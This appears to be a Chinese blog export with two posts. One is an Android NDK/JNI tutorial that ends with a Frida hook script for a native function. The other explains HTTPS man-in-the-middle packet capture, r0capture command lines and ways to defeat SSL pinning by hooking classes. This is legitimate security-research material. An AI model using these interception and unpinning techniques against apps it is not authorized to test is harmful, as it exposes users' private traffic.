设备使用不同的 CPU，而不同的 CPU 支持不同的指令集。CPU 与指令集的每种组合都有专属的应用二进制接口 (ABI)。ABI（Application binary interface）应用程序二进制接口。不同的 CPU 与指令集的每种组合都有定义的 ABI (应用程序二进制接口)，一段程序只有遵循这个接口规范才能在该 CPU 上运行，所以同样的程序代码为了兼容多个不同的 CPU，需要为不同的 ABI 构建不同的库文件。当然对于 CPU 来说，不同的架构并不意味着一定互不兼容。 https://developer.android.com/ndk/guides/abis 工程123456789101112131415161718192021222324252627282930313233343536package com.example.myso;import androidx.appcompat.app.AppCompatActivity;import android.os.Bundle;import android.widget.TextView;import com.example.myso.databinding.ActivityMainBinding;public class MainActivity extends AppCompatActivity &#123; // Used to load the &#x27;myso&#x27; library on application startup. static &#123; System.loadLibrary(&quot;myso&quot;); //创建的 so 文件名，并加载 &#125; private ActivityMainBinding binding; @Override protected void onCreate(Bundle savedInstanceState) &#123; super.onCreate(savedInstanceState); binding = ActivityMainBinding.inflate(getLayoutInflater()); setContentView(binding.getRoot()); // Example of a call to a native method TextView tv = binding.sampleText; tv.setText(stringFromJNI()); &#125; /** * A native method that is implemented by the &#x27;myso&#x27; native library, * which is packaged with this application. */ public native String stringFromJNI(); //native 函数的声明&#125; so 库需要在运行时调用 System.loadLibrary(…) 加载，一般有 2 种调用时机： 1、在类静态初始化中： 如果只在一个类或者很少类中使用到该 so 库，则最常见的方式是在类的静态初始化块中调用； 2、在 Application 初始化时调用： 如果有很多类需要使用到该 so 库，则可以考虑在 Application 初始化等场景中提前加载。 native-lib.cpp JNI 函数的静态注册规则 12345678910#include &lt;jni.h&gt;#include &lt;string&gt;extern &quot;C&quot; JNIEXPORT jstring JNICALLJava_com_example_myso_MainActivity_stringFromJNI( JNIEnv* env, jobject /* this */) &#123; std::string hello = &quot;Hello from C++&quot;; return env-&gt;NewStringUTF(hello.c_str());&#125; extern &quot;C&quot;：指定 C++ 代码使用 C 风格的链接，以避免 C++ 名称修饰（name mangling），确保 Java 可以找到这个函数。 JNIEXPORT 和 JNICALL：是宏定义，用于指示 JNI 的函数返回类型和调用约定。表示一个函数需要暴露给共享库外部使用时。 在 Window 和 Linux 上有不同的定义 12345678910111213// Windows 平台 :#define JNIEXPORT __declspec(dllexport)#define JNIIMPORT __declspec(dllimport)// Linux 平台：#define JNIIMPORT#define JNIEXPORT __attribute__ ((visibility (&quot;default&quot;)))// Windows 平台 :#define JNICALL __stdcall // __stdcall 是一种函数调用参数的约定 , 表示函数的调用参数是从右往左。// Linux 平台：#define JNICALL jstring：函数的返回类型，表示返回一个 Java 字符串。 Java_com_example_myso_MainActivity_stringFromJNI：这是 JNI 函数的名称，遵循特定的命名规则，以便 Java 能找到它。采用 JNI 函数静态注册约定的函数命名规则 JNIEnv* env：指向 JNI 环境的指针，用于访问 JNI 函数。 jobject /* this */：指向调用该方法的 Java 对象的引用。在这里我们没有使用它，所以用注释标记。 jobject 在 native 函数的声明改为 static 时，使用 jclass，因为静态方法可以通过类直接调用。 hello.c_str()：将 std::string 转换为 C 风格的字符串（const char*）。 env-&gt;NewStringUTF(...)：调用 JNI 提供的函数，将 C 风格字符串转换为 Java 字符串（jstring）。该方法会在 Java 堆上创建一个新的字符串对象，并返回其引用。 cmake 脚本。Java 的数据和 so 的数据不互通，如果 so 的数据最后要转到 java 层处理就需要 NewstringUTF，因此 NewstringUTF 可以成为一个 hook 点。 123456789101112131415161718192021222324252627282930313233343536373839# For more information about using CMake with Android Studio, read the# documentation: https://d.android.com/studio/projects/add-native-code.html.# For more examples on how to use CMake, see https://github.com/android/ndk-samples.# Sets the minimum CMake version required for this project.//这些注释提供了有关如何在 Android Studio 中使用 CMake 的文档链接和示例，供开发者参考。cmake_minimum_required(VERSION 3.22.1)//该行指定此项目所需的最低 CMake 版本。确保使用的 CMake 版本符合要求。# Declares the project name. The project name can be accessed via $&#123; PROJECT_NAME&#125;,# Since this is the top level CMakeLists.txt, the project name is also accessible# with $&#123;CMAKE_PROJECT_NAME&#125; (both CMake variables are in-sync within the top level# build script scope). project(&quot;myso&quot;)//这里声明了项目的名称为 &quot;myso&quot;，在整个 CMake 文件中，可以通过 $&#123;PROJECT_NAME&#125; 和 $&#123;CMAKE_PROJECT_NAME&#125; 访问这个名称。# Creates and names a library, sets it as either STATIC# or SHARED, and provides the relative paths to its source code.# You can define multiple libraries, and CMake builds them for you.# Gradle automatically packages shared libraries with your APK.## In this top level CMakeLists.txt, $&#123;CMAKE_PROJECT_NAME&#125; is used to define# the target library name; in the sub-module&#x27;s CMakeLists.txt, $&#123;PROJECT_NAME&#125;# is preferred for the same purpose.## In order to load a library into your app from Java/Kotlin, you must call# System.loadLibrary() and pass the name of the library defined here;# for GameActivity/NativeActivity derived applications, the same library name must be# used in the AndroidManifest.xml file.add_library($&#123;CMAKE_PROJECT_NAME&#125; SHARED # List C/C++ source files with relative paths to this CMakeLists.txt. native-lib.cpp)//add_library 创建一个名为 $&#123;CMAKE_PROJECT_NAME&#125; 的库（在这里是 &quot; myso &quot;），并指定为共享库（SHARED）。这表示生成的库可以被其他应用程序共享使用。//native-lib.cpp 是要编译的源文件，使用相对路径引用。# Specifies libraries CMake should link to your target library. You# can link libraries from various origins, such as libraries defined in this# build script, prebuilt third-party libraries, or Android system libraries.target_link_libraries($&#123;CMAKE_PROJECT_NAME&#125; # List libraries link to the target library android log)//这一部分指定了要链接到目标库的其他库，包括 Android 系统库 android 和 log。这些库通常用于 Android 开发中的日志记录和其他系统功能。 CMakeLists.txt 中主要定义了哪些文件需要编译，以及和其他库的关系等。 123456789101112131415161718192021cmake_minimum_required(VERSION 3.4.1)# 编译出一个动态库 native-lib，源文件只有 src/main/cpp/native-lib.cppadd_library( # Sets the name of the library. native-lib # Sets the library as a shared library. SHARED # Provides a relative path to your source file(s). src/main/cpp/native-lib.cpp )# 找到预编译库 log_lib 并link到我们的动态库 native-lib中find_library( # Sets the name of the path variable. log-lib # Specifies the name of the NDK library that # you want CMake to locate. log )target_link_libraries( # Specifies the target library. native-lib # Links the target library to the log library # included in the NDK. $&#123;log-lib&#125; ) grdle 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748plugins &#123; alias(libs.plugins.android.application)&#125;android &#123; namespace &#x27;com.example.myso&#x27; compileSdk 34 defaultConfig &#123; applicationId &quot;com.example.myso&quot; minSdk 26 targetSdk 34 versionCode 1 versionName &quot;1.0&quot; testInstrumentationRunner &quot;androidx.test.runner.AndroidJUnitRunner&quot; &#125; buildTypes &#123; release &#123; minifyEnabled false proguardFiles getDefaultProguardFile(&#x27;proguard-android-optimize.txt&#x27;), &#x27;proguard-rules.pro&#x27; &#125; &#125; compileOptions &#123; sourceCompatibility JavaVersion.VERSION_1_8 targetCompatibility JavaVersion.VERSION_1_8 &#125; externalNativeBuild &#123; cmake &#123; path file(&#x27;src/main/cpp/CMakeLists.txt&#x27;) version &#x27;3.22.1&#x27; &#125; &#125; buildFeatures &#123; viewBinding true &#125;&#125;dependencies &#123; implementation libs.appcompat implementation libs.material implementation libs.constraintlayout testImplementation libs.junit androidTestImplementation libs.ext.junit androidTestImplementation libs.espresso.core&#125; JavaVM 和 JNIEnvJavaVM 和 JNIEnv 是定义在 jni.h 头文件中最关键的两个数据结构： JavaVM： 代表 Java 虚拟机，每个 Java 进程有且仅有一个全局的 JavaVM 对象，JavaVM 可以跨线程共享； JNIEnv： 代表 Java 运行环境，每个 Java 线程都有各自独立的 JNIEnv 对象，JNIEnv 不可以跨线程共享。 JavaVM 和 JNIEnv 的类型定义在 C 和 C++ 中略有不同，但本质上是相同的，内部由一系列指向虚拟机内部的函数指针组成。 类似于 Java 中的 Interface 概念，不同的虚拟机实现会从它们派生出不同的实现类，而向 JNI 层屏蔽了虚拟机内部实现 jni.h 中，JNIInvokeInterface* 和 JNINativeInterface* 这两个结构体指针是 JavaVM 和 JNIEnv 的实体 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253struct _JNIEnv;struct _JavaVM;#if defined(__cplusplus)// 如果定义了 __cplusplus 宏，则按照 C++ 编译typedef _JNIEnv JNIEnv;typedef _JavaVM JavaVM;#else// 按照 C 编译typedef const struct JNINativeInterface* JNIEnv;typedef const struct JNIInvokeInterface* JavaVM;#endif/* * C++ 版本的 _JavaVM，内部是对 JNIInvokeInterface* 的包装 */struct _JavaVM &#123; // 相当于 C 版本中的 JNIEnv const struct JNIInvokeInterface* functions; // 转发给 functions 代理 jint DestroyJavaVM() &#123; return functions-&gt;DestroyJavaVM(this); &#125; jint AttachCurrentThread(JNIEnv** p_env, void* thr_args) &#123; return functions-&gt;AttachCurrentThread(this, p_env, thr_args); &#125; jint DetachCurrentThread() &#123; return functions-&gt;DetachCurrentThread(this); &#125; jint GetEnv(void** env, jint version) &#123; return functions-&gt;GetEnv(this, env, version); &#125; jint AttachCurrentThreadAsDaemon(JNIEnv** p_env, void* thr_args) &#123; return functions-&gt;AttachCurrentThreadAsDaemon(this, p_env, thr_args); &#125;#endif /*__cplusplus*/&#125;;/* * C++ 版本的 JNIEnv，内部是对 JNINativeInterface* 的包装 */struct _JNIEnv &#123; // 相当于 C 版本的 JavaVM const struct JNINativeInterface* functions;//在_JNIEnv 中定义了一个 functions 变量，这个变量是指向 JNINativeInterface 的指针。 // 转发给 functions 代理 jint GetVersion() &#123; return functions-&gt;GetVersion(this); &#125; jclass DefineClass(const char *name, jobject loader, const jbyte* buf, jsize bufLen) &#123; return functions-&gt;DefineClass(this, name, loader, buf, bufLen); &#125; jclass FindClass(const char* name) &#123; return functions-&gt;FindClass(this, name); &#125; ...&#125;; 结构体 12345678910111213141516171819202122/* * JavaVM */struct JNIInvokeInterface &#123; // 一系列函数指针 jint (*DestroyJavaVM)(JavaVM*); jint (*AttachCurrentThread)(JavaVM*, JNIEnv**, void*); jint (*DetachCurrentThread)(JavaVM*); jint (*GetEnv)(JavaVM*, void**, jint); jint (*AttachCurrentThreadAsDaemon)(JavaVM*, JNIEnv**, void*);&#125;;/* * JNIEnv */struct JNINativeInterface &#123; // 一系列函数指针 jint (*GetVersion)(JNIEnv *); jclass (*DefineClass)(JNIEnv*, const char*, jobject, const jbyte*, jsize); jclass (*FindClass)(JNIEnv*, const char*); ...&#125;; log 输出123456// 不同的日志级别#define LOGD(...) __android_log_print(ANDROID_LOG_DEBUG, LOG_TAG, __VA_ARGS__)#define LOGI(...) __android_log_print(ANDROID_LOG_INFO, LOG_TAG, __VA_ARGS__)#define LOGW(...) __android_log_print(ANDROID_LOG_WARN, LOG_TAG, __VA_ARGS__)#define LOGE(...) __android_log_print(ANDROID_LOG_ERROR, LOG_TAG, __VA_ARGS__)#define LOGF(...) __android_log_print(ANDROID_LOG_FATAL, LOG_TAG, __VA_ARGS__) ANDROID_LOG_DEBUG: 调试信息 ANDROID_LOG_INFO: 一般信息 ANDROID_LOG_WARN: 警告信息 ANDROID_LOG_ERROR: 错误信息 ANDROID_LOG_FATAL: 致命错误 JNI 函数注册静态注册 JNI 函数静态注册采用的是基于「约定」的命名规则，通过 javah 可以自动生成 native 方法对应的函数声明（IDE 会智能生成，不需要手动执行命令）。名称格式为 Java_&lt;包名&gt;_&lt;类名&gt;_&lt;方法名&gt;。 静态注册的命名规则分为「无重载」和「有重载」2 种情况：无重载时采用「短名称」规则，有重载时采用「长名称」规则。 短名称规则（short name）： Java_[类的全限定名 (带下划线)]_[方法名] ，其中类的全限定名中的 . 改为 _ ； 长名称规则（long name）： 在短名称的基础上后追加两个下划线（__）和参数描述符，以区分函数重载。 系统会通过 dlopen 加载对应的 so，通过 dlsym 来获取指定名字的函数地址，然后调用静态注册的 jni 函数 动态注册 JNI 函数静态注册是在首次调用 Java native 方法时搜索对应的 JNI 函数，而动态注册则是提前手动建立映射关系，并且不需要遵守静态注册的 JNI 函数命名规则。 动态注册使用方法动态注册需要使用 RegisterNatives(...) 函数，其定义在 jni.h 文件中： 12345678910111213141516struct JNINativeInterface &#123; // 注册 // 参数二：Java Class 对象的表示 // 参数三：JNINativeMethod 结构体数组 // 参数四：JNINativeMethod 结构体数组长度 jint (*RegisterNatives)(JNIEnv*, jclass, const JNINativeMethod*, jint); // 注销 // 参数二：Java Class 对象的表示 jint (*UnregisterNatives)(JNIEnv*, jclass);&#125;;typedef struct &#123; const char* name; // Java 方法名 const char* signature; // Java 方法描述符 void* fnPtr; // JNI 函数指针&#125; JNINativeMethod; 动态注册原理分析RegisterNatives 方式的本质是直接通过结构体指定映射关系，而不是等到调用 native 方法时搜索 JNI 函数指针，因此动态注册的 native 方法调用效率更高。此外，还能减少生成 so 库文件中导出符号的数量，则能够优化 so 库文件的体积。 注册 JNI 函数的时机 注册时机 注册方式 描述 在第一次调用该 native 方法时 静态注册 虚拟机会在 JNI 函数库中搜索函数指针并记录下来，后续调用不需要重复搜索 加载 so 库时 动态注册 加载 so 库时会自动回调 JNI_OnLoad 函数，在其中调用 RegisterNatives 注册 提前注册 动态注册 在加载 so 库后，调用该 native 方法前，通过静态注册的 native 函数触发 RegisterNatives 注册。例如在 App 启动时，很多系统源码会提前做一次注册 so 加载在 Android 添加 so 有两种方式， 一种是调用 load(String filename) 方法，传递进去的是路径； 另一种是调用 loadLibrary(String libname) 方式，传递进去的是 so 的名称 12345678System.loadLibrary(libPath)-&gt; Runtime.load0(libPath) -&gt; nativeLoad(libPath)System.loadLibrary(libName)-&gt; Runtime.loadLibrary0(libNane) -&gt; ClassLoader#findLibrary(libName)-&gt; DexPathList#findLibrary(libName) -&gt; nativeLoad(libPath) nativeLoad123456789101112131415161718192021222324252627282930313233343536373839404142434445//共享库列表std::unique_ptr&lt;Libraries&gt; libraries_;//已简化bool JavaVMExt::LoadNativeLibrary(JNIEnv* env, const std::string&amp; path, jobject class_loader, std::string* error_msg) &#123; SharedLibrary* library; Thread* self = Thread::Current(); //1、检查是否已经加载过 library = libraries_-&gt;Get(path); //2、已经加载过，跳过 if (library != nullptr) &#123; ... return true; &#125; //3、调用 dlopen 打开 so 库 void* handle = dlopen(path,RTLD_NOW); //4、创建共享库 std::unique_ptr&lt;SharedLibrary&gt; new_library( new SharedLibrary(env, self, path, handle, needs_native_bridge, 关注点：共享库中持有 ClassLoader（卸载 so 库时用到） class_loader, class_loader_allocator)); //5、将共享库记录到 libraries_ 表中 libraries_-&gt;Put(path, library); // 6、调用 so 库中的 JNI_OnLoad 方法 void* sym = dlsym(library,&quot;JNI_OnLoad&quot;); typedef int (*JNI_OnLoadFn)(JavaVM*, void*); JNI_OnLoadFn jni_on_load = reinterpret_cast&lt;JNI_OnLoadFn&gt;(sym); int version = (*jni_on_load)(this, nullptr); return true&#125; JNI_OnLoad在使用 native 方法前都会先加载该 native 方法的 so 文件，通常在一个类的静态代码块中进行加载，当然也可以在构造函数，或者调用前加载。jvm 在加载 so 时都会先调用 so 中的 JNI_OnLoad 函数，如果你没有重写该方法，那么系统会给你自动生成一个。 123456789JNIEXPORT jint JNI_OnLoad(JavaVM *vm, void *reserved) &#123; JNIEnv *env = nullptr; if (vm-&gt;GetEnv((void **) &amp;env, JNI_VERSION_1_6) != JNI_OK) &#123; LOGD(&quot;GetEnv failed&quot;); return -1; &#125; return JNI_VERSION_1_6; //如果我们的 *.so 中没有提供 JNI_OnLoad()函数，VM 会默认该*.so 档是使用最老的 JNI 1.1 版本。&#125; 1、一个 so 中可以不定义 JNI_OnLoad，一旦定义了 JNI_OnLoad，在 so 被加载的时候会自动执行，必须返回 JNI 版本 JNI_VERSION_1_6 卸载 so 库12345678910111213141516171819202122232425262728已简化void UnloadNativeLibraries()&#123; //1、遍历共享库列表 libraries_ for (auto it = libraries_.begin(); it != libraries_.end(); ) &#123; SharedLibrary* const library = it-&gt;second; //2、检查关联的 ClassLoader 是否卸载（unload） const jweak class_loader = library-&gt;GetClassLoader(); if (class_loader != nullptr &amp;&amp; self-&gt;IsJWeakCleared(class_loader)) &#123; //3、记录需要卸载的共享库 unload_libraries.push_back(library); it = libraries_.erase(it); &#125; else &#123; ++it; &#125; &#125; //4、遍历需要卸载的共享库，执行 JNI_OnUnloadFn() typedef void (*JNI_OnUnloadFn)(JavaVM*, void*); for (auto library : unload_libraries) &#123; void* const sym = dlsym(library, &quot;JNI_OnUnload&quot;) JNI_OnUnloadFn jni_on_unload = reinterpret_cast&lt;JNI_OnUnloadFn&gt;(sym); jni_on_unload(self-&gt;GetJniEnv()-&gt;GetVm(), nullptr); 5、回收内存 delete library; &#125;&#125; 数据类型转换Java 类型映射基础数据类型： 会直接转换为 C&#x2F;C++ 的基础数据类型，例如 int 类型映射为 jint 类型。由于 jint 是 C&#x2F;C++ 类型，所以可以直接当作普通 C&#x2F;C++ 变量使用，而不需要依赖 JNIEnv 环境对象； 引用数据类型： 对象只会转换为一个 C&#x2F;C++ 指针，例如 Object 类型映射为 jobject 类型。由于指针指向 Java 虚拟机内部的数据结构，所以不可能直接在 C&#x2F;C++ 代码中操作对象，而是需要依赖 JNIEnv 环境对象。另外，为了避免对象在使用时突然被回收，在本地方法返回前，虚拟机会固定（pin）对象，阻止其 GC。 基础数据类型在映射时是直接映射，而不会发生数据格式转换。例如，Java char 类型在映射为 jchar 后旧是保持 Java 层的样子，数据长度依旧是 2 个字节，而字符编码依旧是 UNT-16 编码。 123456789101112131415161718192021222324252627282930typedef uint8_t jboolean; /* unsigned 8 bits */typedef int8_t jbyte; /* signed 8 bits */typedef uint16_t jchar; /* unsigned 16 bits */ /* 注意：jchar 是 2 个字节 */typedef int16_t jshort; /* signed 16 bits */typedef int32_t jint; /* signed 32 bits */typedef int64_t jlong; /* signed 64 bits */typedef float jfloat; /* 32-bit IEEE 754 */typedef double jdouble; /* 64-bit IEEE 754 */typedef jint jsize;#ifdef __cplusplus// 内部的数据结构由虚拟机实现，只能从虚拟机源码看class _jobject &#123;&#125;;class _jclass : public _jobject &#123;&#125;;class _jstring : public _jobject &#123;&#125;;class _jarray : public _jobject &#123;&#125;;class _jobjectArray : public _jarray &#123;&#125;;class _jbooleanArray : public _jarray &#123;&#125;;...// 说明我们接触到到 jobject、jclass 其实是一个指针typedef _jobject* jobject;typedef _jclass* jclass;typedef _jstring* jstring;typedef _jarray* jarray;typedef _jobjectArray* jobjectArray;typedef _jbooleanArray* jbooleanArray;...#else /* not __cplusplus */...#endif /* not __cplusplus */ 字符串类型操作 Java 中的 java.lang.String 字符串类型也会映射为一个 jobject 指针。可能是因为字符串的使用频率实在是太高了，所以 JNI 规范还专门定义了一个 jobject 的派生类 jstring 来表示 Java String 类型，这个相对特殊。 由于 Java 与 C&#x2F;C++ 默认使用不同的字符编码，因此在操作字符数据时，需要特别注意在 UTF-16 和 UTF-8 两种编码之间转换。 1、Java String 对象转换为 C&#x2F;C++ 字符串： 调用 GetStringUTFChars 函数将一个 jstring 指针转换为一个 UTF-8 的 C&#x2F;C++ 字符串，并在不再使用时调用 ReleaseStringChars 函数释放内存； 2、构造 Java String 对象： 调用 NewStringUTF 函数构造一个新的 Java String 字符串对象。 数组类型操作与 jstring 的处理方式类似，JNI 规范将 Java 数组定义为 jobject 的派生类 jarray ： 基础类型数组：定义为 jbooleanArray 、jintArray 等； 引用类型数组：定义为 jobjectArray 。 下面区分基础类型数组和引用类型数组两种情况： 操作基础类型数组（以 jintArray 为例）： 1、Java 基本类型数组转换为 C&#x2F;C++ 数组： 调用 GetIntArrayElements 函数将一个 jintArray 指针转换为 C&#x2F;C++ int 数组； 2、修改 Java 基本类型数组： 调用 ReleaseIntArrayElements 函数并使用模式 0； 3、构造 Java 基本类型数组： 调用 NewIntArray 函数构造 Java int 数组。 NDK 多线程创建线程的方法在 JNI 开发中，有两种创建线程的方式： 方法 1 - 通过 Java API 创建： 使用我们熟悉的 Thread#start() 可以创建线程，优点是可以方便地设置线程名称和调试； 方法 2 - 通过 C&#x2F;C++ API 创建： 使用 pthread_create() 或 std::thread 也可以创建线程 1234567891011121314void *thr_fn(void *arg) &#123; printids(&quot;new thread: &quot;); return NULL;&#125;int main(void) &#123; pthread_t ntid; //第一个是指向 pthread 的指针，也是线程 id，第二个是线程属性，第三个是线程执行的函数，第四个是函数参数 err = pthread_create(&amp;ntid, NULL, thr_fn, NULL); if (err != 0) &#123; printf(&quot;can&#x27;t create thread: %s\\n&quot;, strerror(err)); &#125; return 0;&#125; 线程引用JNIEnv： JNIEnv 只在所在的线程有效，在不同线程中调用 JNI 函数时，必须使用该线程专门的 JNIEnv 指针，不能跨线程传递和使用。通过 AttachCurrentThread 函数将当前线程依附到 JavaVM 上，获得属于当前线程的 JNIEnv 指针。如果当前线程已经依附到 JavaVM，也可以直接使用 GetEnv 函数。 局部引用： 局部引用只在创建的线程和方法中有效，不能跨线程使用。可以将局部引用升级为全局引用后跨线程使用 12345678// 局部引用jclass localRefClz = env-&gt;FindClass(&quot;java/lang/String&quot;);// 释放全局引用（非必须）env-&gt;DeleteLocalRef(localRefClz);// 局部引用升级为全局引用jclass globalRefClz = env-&gt;NewGlobalRef(localRefClz);// 释放全局引用（必须）env-&gt;DeleteGlobalRef(globalRefClz); 默认的线程属性是 joinable 随着主线程结束而结束 12pthread_create(&amp;pthread, nullptr, reinterpret_cast&lt;void *(*)(void *)&gt;(myThread), nullptr); //线程属性是 dettach，可以分离执行 JavaVM 的获取方式123456789101112JNIEXPORT jint JNI_OnLoad(JavaVM *vm, void *reserved) &#123; JNIEnv *env = nullptr; if (vm-&gt;GetEnv((void **) &amp;env, JNI_VERSION_1_6) != JNI_OK) &#123; LOGD(&quot;GetEnv failed&quot;); return -1; &#125; LOGD(&quot;JavaVM %p&quot;,vm); JavaVM** vm1; env-&gt;GetJavaVM(vm1); LOGD(&quot;env-&gt;GetJavaVM %p&quot;,*vm1); return JNI_VERSION_1_6;&#125; hook12345678910111213141516171819202122232425262728function hook_native()&#123; var libnative_addr = Module.findBaseAddress(&#x27;libnative-lib.so&#x27;);//so 文件名 console.log(&quot;libnative_addr is =&gt; &quot;,libnative_addr) var stringfromJNI3 = libnative_addr.add(0xf454);//hook 的函数地址 baseadress+偏移 console.log(&quot;stringfromJNI3 address is =&gt;&quot;,stringfromJNI3); var stringfromJNI3_2 = Module.findExportByName(&#x27;libnative-lib.so&#x27;, &quot;_Z14stringFromJNI3P7_JNIEnvP7_jclassP8_jstring&quot;) console.log(&quot;stringfromJNI3_2 address is =&gt;&quot;,stringfromJNI3_2); Interceptor.attach(stringfromJNI3_2,&#123; onEnter:function(args)&#123; console.log(&quot;jnienv pointer =&gt;&quot;,args[0]) console.log(&quot;jobj pointer =&gt;&quot;,args[1]) console.log(&quot;jstring pointer=&gt;&quot;,Java.vm.getEnv().getStringUtfChars(args[2], null).readCString() ) &#125;,onLeave:function(retval)&#123; console.log(&quot;retval is =&gt;&quot;,Java.vm.getEnv().getStringUtfChars(retval, null).readCString()) console.log(&quot;=================&quot;) &#125; &#125;)&#125;function main()&#123; hook_native()&#125;setImmediate(main)","categories":[],"tags":[{"name":"NDK","slug":"NDK","permalink":"http://example.com/tags/NDK/"}],"keywords":[]},{"title":"Packet_Capture","slug":"Packet_Capture","date":"2024-10-09T07:17:27.000Z","updated":"2024-11-11T09:25:11.462Z","comments":true,"path":"2024/10/09/Packet_Capture/","link":"","permalink":"http://example.com/2024/10/09/Packet_Capture/","excerpt":"","text":"抓包技术分类：业务层：Hook 框架，SDK 分析 应用层：中间人代理抓包， 传输层：socket 通信抓包 网络层：网卡抓包 我们接下来主要考虑应用层 HTTPS 原理HTTPS（HyperText Transfer Protocol Secure）是 HTTP 协议的安全版本，通过加密数据的传输来保护用户的隐私和数据完整性。HTTPS 通信的安全性主要依赖于 SSL&#x2F;TLS（Secure Sockets Layer&#x2F;Transport Layer Security）协议。 CA 证书校验： CA 证书校验发生在 TLS 的前两次握手，客户端和服务端通过 Client Hello、Server Hello 等报文获得服务端 CA 证书，客户端验证 CA 证书合法性，从而确认 CA 证书中的公钥合法性（大多数场景不会做双向认证，即服务端不会认证客户端合法性，这里先不考虑）； 密钥协商： 在确认服务器的身份后，客户端和服务器开始 SSL&#x2F;TLS 握手，协商出一个对称加密密钥（称为会话密钥）。握手的过程使用非对称加密算法（如 RSA、ECDHE 等）来确保密钥传输的安全性。 数据传输： 客户端和服务器使用生成的对称会话密钥对后续通信的数据进行加密。 CA 的主要作用 1）颁发证书，颁发证书其实就是使用 CA 的私钥对证书请求 签名文件 进行签名； 2）颁发的证书浏览器要信任，浏览器只需要用 CA 的公钥进行验签成功就表示这个证书是合法可信的，这就需要浏览器内置 CA 的公钥，也就是内置 CA 的证书。一般来说，操作系统都会内置权威 CA 的证书，有的浏览器会使用操作系统内置的 CA 证书列表，有的浏览器则自己维护的 CA 证书列表，比如 Firefox。 抓包原理-中间人攻击原理：截获通信：攻击者拦截用户到服务器的流量，以便对 HTTPS 通信进行操控。 伪造 SSL 证书：为了绕过客户端对服务器的身份认证，攻击者会生成伪造的 SSL 证书，将其伪装成目标服务器的合法证书。 中断 TLS 握手：攻击者在客户端和服务器之间劫持 TLS 握手，通过伪造的证书来欺骗客户端，同时与服务器建立独立的 TLS 连接。 解密和篡改数据：攻击者能够解密通信内容并篡改数据后再发送给目标。 中间人攻击（Man-in-the-MiddleAttack，MITM）的方案： 将客户端的网络流量代理到 MITM 主机，再通过一系列的面板或工具将网络请求结构化地呈现出来。 第一个问题 —— 加密： 加密： 由于 HTTPS 通信中对称密钥 Master Secret 只有通信双方才持有，MITM 无法解密密文，导致在抓包工具上也只能看到一堆无意义的乱码。 代理抓包工具通过伪造一个与真实服务器同名的证书，攻击者欺骗客户端，使其认为连接的服务器可信。这样子就可以发送一个自己的公钥，客户端拿抓包工具的公钥去加密对称密钥，而抓包工具可以用自己的私钥去解密。相当于把浏览器的对称密钥骗了出来。而如果不进行证书替换，抓包工具是没有私钥的，这样子就无法进行解密。 要解决这个问题，只能想办法让 MITM 也获得这个对称密钥。此时，MITM 不仅要做流量拦截，还需要伪装成真实的客户端和服务端，与真实的通信双方分别建立独立的连接。我们来看下在中间人攻击下，HTTPS 的三阶段： 连接 1：客户端与中间人的 HTTPS 连接： CA 证书校验： 客户端与 MITM 握手，MITM 返回一个 “调包” 的 CA 证书（为了让客户端验证 CA 证书通过，需要提前在系统上安装 MITM 的证书）； 密钥协商： 客户端和 MITM 基于 “调包” 的公钥和私钥进行非对称加密通信，协商获得对称密钥； 数据传输： 客户端和 MITM 基于协商的对称密钥进行对称加密通信，此时 MITM 就可以解密出明文。 连接 2：中间人与服务端的 HTTPS 连接： CA 证书校验： MITM 与 服务端握手，服务端返回 CA 证书，由于服务端证书本来就是合法的，因此 MITM 可以拿到服务端公钥； 密钥协商： MITM 和服务端分别基于公钥和私钥进行非对称加密通信，协商获得 Master Secret 对称加密私钥； 数据传输： MITM 和服务端基于协商的对称密钥进行对称加密通信。 到这里，MITM 就成功与真实的客户端和服务端建立了独立的连接，发送的密文在 MITM 上就可以成功解密出来了。 抓包实践工具burpsuite 抓取手机 APP 的 http、https 数据包——教程_burpsuite 怎么抓取手机请求-CSDN 博客 charles 安卓手机抓包——配置——超详细_charles 安卓手机抓包-CSDN 博客 frida hook优点：无视证书，基于 hook 直接得到参数，找调用栈 缺点：不如抓包软件全面 实用 FRIDA 进阶：内存漫游、hook anywhere、抓包-安全客 - 安全资讯平台 (anquanke.com) R0capturer0ysue&#x2F;r0capture: 安卓应用层抓包通杀脚本 先安装依赖 pip install hexdump 命令： Spawn 模式： 1$ python3 r0capture.py -U -f com.coolapk.market -v Attach 模式，抓包内容保存成 pcap 文件供后续分析： 1$ python3 r0capture.py -U 酷安 -v -p iqiyi.pcap 建议使用 Attach 模式，从感兴趣的地方开始抓包，并且保存成 pcap 文件，供后续使用 Wireshark 进行分析。 客户端证书导出功能：默认开启；必须以 Spawm 模式运行； ecapture：基于 epbfecapture&#x2F;README_CN.md at master · gojue&#x2F;ecapture 中间人抓包对抗高版本安卓如何导入证书：1 Magisk-Move Certifivates 模块 2 AOSP 编译 中间人抓不到包如何确认： C 校验 S（单向时），没有将抓包工具证书放在手机种 400Badrequest S 校验 C（双向时）没有向抓包工具配置 APP 证书 NorequiredSSLcertificatewassent 3SSLPINNING 告诉你证书没配置好，其实你已经配置好了 单向证书认证：客户端校验服务器证书–SSL PinningSSL Pinning 是在客户端侧通过“固化”服务器的公钥或证书，确保客户端只信任与预期一致的服务器。即使攻击者拥有合法的证书或其他 CA 签署的证书，也无法通过 SSL Pinning 机制的校验，从而增强安全性。 SSL Pinning 的实现方式SSL Pinning 主要有以下几种实现方式： 证书固定（Certificate Pinning）：将服务器的证书直接存储在客户端应用中。连接时，客户端会将服务器返回的证书与存储的证书进行比对。 公钥固定（Public Key Pinning）：将服务器的公钥存储在客户端中，验证时仅比对公钥。这种方式即使证书更新，只要公钥不变，依然能通过校验。 SSL Pinning 的流程SSL Pinning 的工作流程如下： 存储证书或公钥：在应用开发时，将服务器的证书或公钥指纹（hash 值）预先存储在客户端代码或配置文件中。 连接和比对：在客户端与服务器建立 SSL 连接时，客户端会获取服务器的证书并提取公钥或证书的指纹。 验证证书或公钥： 客户端将从服务器获取的证书&#x2F;公钥指纹与预存的指纹进行比对。 如果指纹匹配，说明服务器是合法的，连接成功；否则连接失败。 对抗针对 sslpinning 这种，可以先用市面上已有的 sslunpinning 工具进行尝试，如果遇到都无法进行成功的情况，那就需要我们去手工进行 hook 了，大致有两种思路，一是对所有 HTTP 字符串相关类进行 Hook，二是考虑到 App 在验证证书时会打开证书文件判断是否是 App 自身所信任的，因此一定会使用 File 类的构造函数打开证书文件获得文件的句柄，所以我们在测试时可以 Hook 上所有 File 类的构造函数，即对 File.$init 函数进行 hook 双向证书认证：服务器校验客户端证书。双向证书认证需要在客户端和服务器上分别配置证书。客户端和服务器的证书通常由同一个 CA 